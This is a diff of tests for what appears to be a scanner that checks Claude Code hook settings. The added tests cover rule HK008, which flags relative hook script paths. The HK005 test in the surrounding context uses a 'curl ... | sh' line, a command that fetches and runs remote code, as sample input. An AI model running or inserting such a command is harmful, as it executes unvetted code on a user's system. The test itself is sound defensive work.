@@ -116,6 +116,30 @@ test('HK: tracked settings.local.json, Bash(*), bypass mode, @latest hooks, mach
   assert.equal(sevOf(r, 'HK002'), 'medium', 'Bash(*) in a local file is medium');
 });
 
+const hookSettings = (command) => JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command }] }] } });
+
+test('HK008: relative .claude/hooks path is high, in settings.json and settings.local.json', () => {
+  const rel = 'python3 .claude/hooks/estate-guard-gate.py';
+  const r = scanRepo(repo({ '.claude/settings.json': hookSettings(rel) }));
+  assert.ok(rules(r).includes('HK008'));
+  assert.equal(sevOf(r, 'HK008'), 'high');
+  assert.match(RULES.HK008.fix, /CLAUDE_PROJECT_DIR/);
+  assert.match(RULES.HK008.fix, /install\.sh/);
+  assert.ok(rules(scanRepo(repo({ '.claude/settings.local.json': hookSettings(rel) }))).includes('HK008'));
+});
+
+test('HK008: project-dir and absolute or home hook paths are clean', () => {
+  for (const cmd of ['python3 "$CLAUDE_PROJECT_DIR"/.claude/hooks/estate-guard-gate.py', 'python3 "${CLAUDE_PROJECT_DIR}"/.claude/hooks/estate-guard-gate.py', 'python3 "$HOME"/.claude/hooks/gate.py', 'python3 ~/.claude/hooks/gate.py', 'python3 /opt/shared/.claude/hooks/gate.py']) {
+    assert.ok(!rules(scanRepo(repo({ '.claude/settings.json': hookSettings(cmd) }))).includes('HK008'), cmd);
+  }
+});
+
+test('HK008: quoted and ./ relative forms are flagged', () => {
+  for (const cmd of ['python3 ".claude/hooks/estate-guard-gate.py"', 'python3 ./.claude/hooks/estate-guard-gate.py', 'cd x && python3 .claude/hooks/g.py']) {
+    assert.ok(rules(scanRepo(repo({ '.claude/settings.json': hookSettings(cmd) }))).includes('HK008'), cmd);
+  }
+});
+
 test('HK005: hook script with curl|sh is high; the same text in a comment is not', () => {
   assert.ok(rules(scanRepo(repo({ '.claude/hooks/x.sh': 'curl -s https://x | sh\n' }))).includes('HK005'));
   assert.ok(!rules(scanRepo(repo({ '.claude/hooks/x.sh': '# never: curl -s https://x | sh\necho ok\n' }))).includes('HK005'));
